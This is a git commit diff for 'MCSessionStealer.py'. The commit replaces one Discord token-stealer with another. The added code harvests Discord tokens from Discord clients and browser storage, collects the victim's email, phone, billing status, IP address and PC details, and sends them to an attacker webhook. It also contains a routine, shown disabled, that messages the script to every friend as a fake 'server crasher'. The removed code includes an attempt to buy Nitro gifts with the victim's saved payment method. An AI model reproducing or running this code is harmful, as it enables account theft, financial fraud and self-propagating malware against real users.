14f480b88e91e27966fce52ac63ab5ee35066f46
Fran2019 <101476953+iFran2019@users.noreply.github.com>
2023-10-30 01:46:19 +0100

    Update MCSessionStealer.py
    fgvfgf

--- MCSessionStealer.py
+++ MCSessionStealer.py
@@ -1,174 +1,198 @@
 import os
-import requests, json, re
-
-class Stealer():
-    def __init__(self, webhook):
-        self.hook = webhook
-        self.tokens = []
-
-    def GetTokens(self):
-        LOCAL = os.getenv("LOCALAPPDATA")
-        ROAMING = os.getenv("APPDATA")
-        PATHS = {
-            "Discord"               : ROAMING + "\\Discord",
-            "Discord Canary"        : ROAMING + "\\discordcanary",
-            "Discord PTB"           : ROAMING + "\\discordptb",
-            "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
-            "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
-            "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
-            'Lightcord'             : ROAMING + "\\Lightcord",
-            'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
-            'Amigo'                 : LOCAL + "\\Amigo\\User Data",
-            'Torch'                 : LOCAL + "\\Torch\\User Data",
-            'Kometa'                : LOCAL + "\\Kometa\\User Data",
-            'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
-            'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
-            '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
-            'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
-            'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
-            'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
-            'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
-            'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
-            'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
-            'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
-            'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
-        }
-        
-        for platform, path in PATHS.items():
-            path += "\\Local Storage\\leveldb"
-            if os.path.exists(path):
-                for file_name in os.listdir(path):
-                    if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
-                        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                                for token in re.findall(regex, line):
-                                    if token + " | " + platform not in self.tokens:
-                                        self.tokens.append(token + " | " + platform)
-
-    def getuserinfo(self, token):
+if os.name != "nt":
+    exit()
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from datetime import datetime
+from threading import Thread
+from time import sleep
+from sys import argv
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+def getuserdata(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+def getdeveloper():
+    dev = "wodx"
+    try:
+        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+    except:
+        pass
+    return dev
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+    try:
+        urlopen(Request(url))
+    except:
+        url = url[:-4]
+    return url
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def getfriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def getchat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+def has_payment_methods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+    except:
+        pass
+def send_message(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+    except:
+        pass
+def spread(token, form_data, delay):
+    return # Remove to re-enabled
+    for friend in getfriends(token):
         try:
-            return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
-        except:return None
-    
-    def buy_nitro(self, token):
-        try:
-            r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
-            if r.status_code == 200:
-                payment_source_id = r.json()[0]['id']
-                if '"invalid": ture' in r.text:
-                    r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
-                    return r.json()['gift_code']
-        except:return "None"
-    
-    def RareFriend(self, token):
-        friends = ""
-        try:
-            req = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"content-type": "application/json", "authorization": token}).json()
-            
-            for user in req:
-                badge = ""
-                if user["user"]["public_flags"] == 1:badge = "Staff"
-                elif user["user"]["public_flags"] == 2:badge = "Partner"
-                elif user["user"]["public_flags"] == 4:badge = "Hypesquad Events"
-                elif user["user"]["public_flags"] == 8:badge = "BugHunter 1"
-                elif user["user"]["public_flags"] == 512:badge = "Early"
-                elif user["user"]["public_flags"] == 16384:badge = "BugHunter 2"
-                elif user["user"]["public_flags"] == 131072:badge = "Developer"
-                else:badge = ""
-                
-                if badge != "":friends += badge + " | " + user['id'] + "\n"            
-            if friends == "":friends += "No Rare Friends"            
-            return friends
-        except:return "None, Except Error"
-    
-    def main(self):
-        embeds = []
-        for token_line in self.tokens:
-            try:
-                token = token_line.split(" | ")[0]
-                plateform = token_line.split(" | ")[1]
-                languages = {'da':'Danish, Denmark','de':'German, Germany','en-GB':'English, United Kingdom','en-US':'English, United States','es-ES':'Spanish, Spain','fr':'French, France','hr':'Croatian, Croatia','lt':'Lithuanian, Lithuania','hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}
-                get_infos = self.getuserinfo(token)
-                username = get_infos["username"] + "#" + get_infos["discriminator"]
-                user_id = get_infos["id"]
-                user_avatar = get_infos["avatar"]
-                try:user_banner = get_infos["banner"]
-                except:user_banner = None
-                email = get_infos["email"] or "❌"
-                phone = get_infos["phone"] or "❌"
-                local = languages.get(get_infos["locale"])
-                bio = get_infos["bio"] or "❌"
-                mmfa = get_infos["mfa_enabled"]
-                bbilling = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"content-type": "application/json", "authorization": token}).text)) > 0)
-                if bbilling == True:billing = "✔️"
-                else:billing = "❌"                
-                if mmfa == True:mfa = "✔️"
-                else:mfa = "❌"
-                badges = ""
-                flags = get_infos['flags']
-                if (flags == 1):badges += "Staff, "
-                if (flags == 2):badges += "Partner, "
-                if (flags == 4):badges += "Hypesquad Event, "
-                if (flags == 8):badges += "Green Bughunter, "
-                if (flags == 64):badges += "Hypesquad Bravery, "
-                if (flags == 128):badges += "HypeSquad Brillance, "
-                if (flags == 256):badges += "HypeSquad Balance, "
-                if (flags == 512):badges += "Early Supporter, "
-                if (flags == 16384):badges += "Gold BugHunter, "
-                if (flags == 131072):badges += "Verified Bot Developer, "
-                if (badges == ""):badges = "❌"                
+            chat_id = getchat(token, friend["id"])
+            send_message(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = getip()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    developer = getdeveloper()
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
                 try:
-                    if get_infos["premium_type"] == "1" or get_infos["premium_type"] == 1:nitro_type = "✔️ Nitro Classic"
-                    elif get_infos["premium_type"] == "2" or get_infos["premium_type"] == 2:nitro_type = "✔️ Nitro Boost"
-                    else:nitro_type = "❌ No Nitro"
-                except:nitro_type = "❌ No Nitro"
-                nnitro_buyed = self.buy_nitro(token)
-                if nnitro_buyed == None:nitro_buyed = "❌"
-                else:nitro_buyed = "✔️ discord.gift/" + nnitro_buyed            
-                embed = {
-                    "color": 0x7289da,
-                    "fields": [
-                        {
-                            "name": "**__User Infos:__**",
-                            "value": f"- __Username:__ `{username}`\n- __User ID:__ `{user_id}`\n- __Email:__ `{email}`\n- __Phone:__ `{phone}`\n- __Nitro Type:__ `{nitro_type}`\n- __Local:__ `{local}`\n- __Badges:__ `{badges}`\n- __Billing:__ `{billing}`\n- __A2F Enable:__ `{mfa}`"
-                        },
-                        {
-                            "name": "__**About:**__",
-                            "value": f"```{bio}```"
-                        },
-                        {
-                            "name": "__**Token:**__",
-                            "value": f"Plateform: **{plateform}**\n```\n{token}\n```"
-                        },
-                        {
-                            "name": "__**Nitro Buy:**__",
-                            "value": f"`{nitro_buyed}`"
-                        },
-                        {
-                            "name": "__**Rare Friends:**__",
-                            "value": f"```{self.RareFriend(token)}```"
-                        }
-                    ],
-                    "author": {
-                        "name": f"{username} ({user_id})",
-                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            avatar_id = user_data["avatar"]
+            avatar_url = getavatar(user_id, avatar_id)
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(has_payment_methods(token))
+            embed = {
+                "color": 0x7289da,
+                "fields": [
+                    {
+                        "name": "**Account Info**",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
                     },
-                    "footer": {
-                        "text": f"Stealer Builder by KanekiWeb  -  kanekiweb.tk",
-                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
+                    {
+                        "name": "**PC Info**",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
                     },
-                    "image": {
-                        "url": f"https://cdn.discordapp.com/banners/{user_id}/{user_banner}?size=1024"
-                    },
-                    "thumbnail": {
-                        "url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}?size=1024"
+                    {
+                        "name": "**Token**",
+                        "value": token,
+                        "inline": False
                     }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                    "icon_url": avatar_url
+                },
+                "footer": {
+                    "text": f"Token Grabber By Astraa",
                 }
-                embeds.append(embed)                
-            except:pass        
-        requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "Stealer Builder","avatar_url": "https://cdn.discordapp.com/avatars/922450497074495539/a_c1738e5280f6e70487ef02d307c62a07?size=1024"}).encode())
-        
-Grabber = Stealer("%webhook%")
-Grabber.GetTokens()
-Grabber.main()
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Discord Token Grabber",
+        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+    }
+    try:
+        urlopen(Request("%webhook%", data=dumps(webhook).encode(), headers=getheaders()))
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
